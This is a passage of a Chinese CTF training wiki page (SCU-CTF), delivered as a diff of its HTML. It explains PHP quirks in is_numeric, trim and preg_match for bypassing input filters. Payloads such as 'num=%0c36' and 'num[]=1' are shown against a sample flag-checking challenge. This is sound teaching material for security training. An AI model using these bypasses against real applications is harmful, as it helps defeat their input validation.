@@ -1,0 +1,1905 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.1.0">
+    
+    
+      
+        <title>函数 - SCU-CTF HomePage</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.982221ab.css">
+      
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.224b79ff.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../../../../assets/javascripts/modernizr.01ccdecf.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700|Source+Code+Pro">
+        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../../../../_static/css/extra.css">
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#_1" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../../../.." title="SCU-CTF HomePage" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              SCU-CTF HomePage
+            </span>
+            <span class="md-header-nav__topic">
+              函数
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/scu-ctf/scu-ctf.github.io/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../../../.." title="Introduction" class="md-tabs__link">
+        Introduction
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../Web/" title="CTFWiki" class="md-tabs__link md-tabs__link--active">
+          CTFWiki
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../WriteUp/2018/Web/" title="WriteUp" class="md-tabs__link">
+          WriteUp
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../比赛信息/" title="比赛信息" class="md-tabs__link">
+          比赛信息
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../../../.." title="SCU-CTF HomePage" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    SCU-CTF HomePage
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/scu-ctf/scu-ctf.github.io/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../../.." title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      CTFWiki
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        CTFWiki
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" checked>
+    
+    <label class="md-nav__link" for="nav-2-1">
+      Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-2" type="checkbox" id="nav-2-1-2">
+    
+    <label class="md-nav__link" for="nav-2-1-2">
+      Java
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-1-2">
+        Java
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../java/" title="Index" class="md-nav__link">
+      Index
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-3" type="checkbox" id="nav-2-1-3">
+    
+    <label class="md-nav__link" for="nav-2-1-3">
+      Nodejs
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-1-3">
+        Nodejs
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../nodejs/" title="Index" class="md-nav__link">
+      Index
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-4" type="checkbox" id="nav-2-1-4" checked>
+    
+    <label class="md-nav__link" for="nav-2-1-4">
+      Php
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-1-4">
+        Php
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../" title="Index" class="md-nav__link">
+      Index
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        函数
+      </label>
+    
+    <a href="./" title="函数" class="md-nav__link md-nav__link--active">
+      函数
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#is_numeric" title="is_numeric" class="md-nav__link">
+    is_numeric
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trimis_numeric" title="trim与is_numeric" class="md-nav__link">
+    trim与is_numeric
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#preg_match" title="preg_match" class="md-nav__link">
+    preg_match
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="数组绕过正则表达式" class="md-nav__link">
+    数组绕过正则表达式
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="正则表达式修饰符" class="md-nav__link">
+    正则表达式修饰符
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#int_val" title="Int_val" class="md-nav__link">
+    Int_val
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hash" title="Hash比较缺陷" class="md-nav__link">
+    Hash比较缺陷
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#md5" title="md5处理数组" class="md-nav__link">
+    md5处理数组
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sha1" title="Sha1处理数组" class="md-nav__link">
+    Sha1处理数组
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#md5_1" title="md5" class="md-nav__link">
+    md5
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#md5_2" title="md5弱比较(==比较漏洞)" class="md-nav__link">
+    md5弱比较(==比较漏洞)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#md5_3" title="md5强碰撞" class="md-nav__link">
+    md5强碰撞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#md5strtrue" title="md5($str,true)类型绕过" class="md-nav__link">
+    md5($str,true)类型绕过
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#in_array" title="In_array中的弱类型比较" class="md-nav__link">
+    In_array中的弱类型比较
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parse_str" title="parse_str" class="md-nav__link">
+    parse_str
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ereg-00" title="ereg---%00正则截断" class="md-nav__link">
+    ereg---%00正则截断
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#is_file" title="is_file" class="md-nav__link">
+    is_file
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phpis_filehighlight_file" title="php伪协议绕过is_file+highlight_file" class="md-nav__link">
+    php伪协议绕过is_file+highlight_file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#procselfrootis_file" title="多次重复/proc/self/root绕过is_file" class="md-nav__link">
+    多次重复/proc/self/root绕过is_file
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-5" type="checkbox" id="nav-2-1-5">
+    
+    <label class="md-nav__link" for="nav-2-1-5">
+      Python
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-1-5">
+        Python
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../python/" title="Index" class="md-nav__link">
+      Index
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      WriteUp
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        WriteUp
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-1" type="checkbox" id="nav-3-1">
+    
+    <label class="md-nav__link" for="nav-3-1">
+      2018
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-1">
+        2018
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/2018/Web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
+    
+    <label class="md-nav__link" for="nav-3-2">
+      201905
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-2">
+        201905
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/201905/Crypto/" title="Crypto" class="md-nav__link">
+      Crypto
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/201905/Misc/" title="MISC" class="md-nav__link">
+      MISC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/201905/Pwn/" title="PWN" class="md-nav__link">
+      PWN
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/201905/Reverse/" title="REVERSE" class="md-nav__link">
+      REVERSE
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/201905/Web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
+    
+    <label class="md-nav__link" for="nav-3-3">
+      202005
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-3">
+        202005
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/202005/Misc/" title="Misc" class="md-nav__link">
+      Misc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/202005/Reverse/" title="Reverse" class="md-nav__link">
+      Reverse
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/202005/Web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../WriteUp/202005/pwn/" title="Pwn" class="md-nav__link">
+      Pwn
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      比赛信息
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        比赛信息
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../比赛信息/" title="比赛信息发布" class="md-nav__link">
+      比赛信息发布
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#is_numeric" title="is_numeric" class="md-nav__link">
+    is_numeric
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trimis_numeric" title="trim与is_numeric" class="md-nav__link">
+    trim与is_numeric
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#preg_match" title="preg_match" class="md-nav__link">
+    preg_match
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="数组绕过正则表达式" class="md-nav__link">
+    数组绕过正则表达式
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="正则表达式修饰符" class="md-nav__link">
+    正则表达式修饰符
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#int_val" title="Int_val" class="md-nav__link">
+    Int_val
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hash" title="Hash比较缺陷" class="md-nav__link">
+    Hash比较缺陷
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#md5" title="md5处理数组" class="md-nav__link">
+    md5处理数组
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sha1" title="Sha1处理数组" class="md-nav__link">
+    Sha1处理数组
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#md5_1" title="md5" class="md-nav__link">
+    md5
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#md5_2" title="md5弱比较(==比较漏洞)" class="md-nav__link">
+    md5弱比较(==比较漏洞)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#md5_3" title="md5强碰撞" class="md-nav__link">
+    md5强碰撞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#md5strtrue" title="md5($str,true)类型绕过" class="md-nav__link">
+    md5($str,true)类型绕过
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#in_array" title="In_array中的弱类型比较" class="md-nav__link">
+    In_array中的弱类型比较
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parse_str" title="parse_str" class="md-nav__link">
+    parse_str
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ereg-00" title="ereg---%00正则截断" class="md-nav__link">
+    ereg---%00正则截断
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#is_file" title="is_file" class="md-nav__link">
+    is_file
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phpis_filehighlight_file" title="php伪协议绕过is_file+highlight_file" class="md-nav__link">
+    php伪协议绕过is_file+highlight_file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#procselfrootis_file" title="多次重复/proc/self/root绕过is_file" class="md-nav__link">
+    多次重复/proc/self/root绕过is_file
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/scu-ctf/scu-ctf.github.io/edit/master/docs/CTFWiki/Web/php/php小tricks.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="_1">函数<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="is_numeric">is_numeric<a class="headerlink" href="#is_numeric" title="Permanent link">&para;</a></h2>
+<p>这个函数就不必多说了，好吧懂英语你就懂了！！！</p>
+<p>来个简单的测试</p>
+<div class="codehilite"><pre><span></span><span class="x">for ($i=0; $i &lt;128 ; $i++) { </span>
+<span class="x">    $x=chr($i).&#39;1&#39;;</span>
+<span class="x">   if(is_numeric($x)==true){</span>
+<span class="x">        echo urlencode(chr($i)).&quot;\n&quot;;</span>
+<span class="x">   }</span>
+<span class="x">}</span>
+</pre></div>
+
+<p>发现下面这些都是测试通过的字符</p>
+<blockquote>
+<p>%09---水平定位符号</p>
+<p>%0A---换行键
+%0B---垂直定位符号
+%0C---换页键
+%0D---归位键
+%2B---就是加号</p>
+<p>%20---空格</p>
+<p>-</p>
+<p>+</p>
+<p>.</p>
+</blockquote>
+<p>但是这个不是重点，重点是配合其他函数搞事情，下面这个例子trim就是一个很好的例子</p>
+<h2 id="trimis_numeric">trim与is_numeric<a class="headerlink" href="#trimis_numeric" title="Permanent link">&para;</a></h2>
+<p>首先搬运工搬运一下官网的介绍</p>
+<div class="codehilite"><pre><span></span><span class="x">语法</span>
+<span class="x">trim(string,charlist)</span>
+
+<span class="x">参数  描述</span>
+<span class="x">string          必需。规定要检查的字符串。</span>
+<span class="x">charlist        可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span>
+
+<span class="x">&quot;\0&quot;       - NULL</span>
+<span class="x">&quot;\t&quot;       - 制表符</span>
+<span class="x">&quot;\n&quot;       - 换行</span>
+<span class="x">&quot;\x0B&quot;     - 垂直制表符</span>
+<span class="x">&quot;\r&quot;       - 回车</span>
+<span class="x">&quot; &quot;        - 空格</span>
+</pre></div>
+
+<p>并且如果你想知道有哪些也可以运行看看</p>
+<div class="codehilite"><pre><span></span><span class="x">for ($i=0; $i &lt;=128 ; $i++) { </span>
+<span class="x">    $x=chr($i).&#39;1&#39;;</span>
+<span class="x">   if(trim($x)!==&#39;1&#39; &amp;&amp;  is_numeric($x)){</span>
+<span class="x">        echo urlencode(chr($i)).&quot;\n&quot;;</span>
+<span class="x">   }</span>
+<span class="x">}</span>
+<span class="x">发现除了+-.号以外还有只剩下%0c也就是换页符了</span>
+</pre></div>
+
+<p>来看一道ctf题目</p>
+<div class="codehilite"><pre><span></span><span class="x">function filter($num){</span>
+<span class="x">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span>
+<span class="x">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span>
+<span class="x">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span>
+<span class="x">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span>
+<span class="x">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span>
+<span class="x">    return $num;</span>
+<span class="x">}</span>
+<span class="x">$num=$_GET[&#39;num&#39;];</span>
+<span class="x">if(is_numeric($num) and $num!==&#39;36&#39; and trim($num)!==&#39;36&#39; and filter($num)==&#39;36&#39;){</span>
+<span class="x">    if($num==&#39;36&#39;){</span>
+<span class="x">        echo $flag;</span>
+<span class="x">    }else{</span>
+<span class="x">        echo &quot;hacker!!&quot;;</span>
+<span class="x">    }</span>
+<span class="x">}else{</span>
+<span class="x">    echo &quot;hacker!!!&quot;;</span>
+<span class="x">}</span>
+</pre></div>
+
+<blockquote>
+<p>payload:num=%0c36</p>
+</blockquote>
+<h2 id="preg_match">preg_match<a class="headerlink" href="#preg_match" title="Permanent link">&para;</a></h2>
+<h3 id="_2">数组绕过正则表达式<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="x">if(preg_match(&quot;/[0-9]/&quot;, $num)){</span>
+<span class="x">        die(&quot;no no no!&quot;);</span>
+<span class="x">}</span>
+</pre></div>
+
+<p>官方文档中介绍如下：</p>
+<div class="codehilite"><pre><span></span><span class="x">preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次</span>
+</pre></div>
+
+<p>所以如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if，达到绕过的效果。</p>
+<blockquote>
+<div class="codehilite"><pre><span></span><span class="x">payload:num[]=1</span>
+</pre></div>
+
+</blockquote>
+<h3 id="_3">正则表达式修饰符<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>首先说明下几个常见的模式：</p>
+<div class="codehilite"><pre><span></span><span class="x">\i </span>
+<span class="x">不区分(ignore)大小写</span>
+
+<span class="x">\m</span>
+<span class="x">多(more)行匹配</span>
+<span class="x">若存在换行\n并且有开始^或结束$符的情况下，</span>
+<span class="x">将以换行为分隔符，逐行进行匹配</span>
+<span class="x">$str = &quot;abc\nabc&quot;;</span>
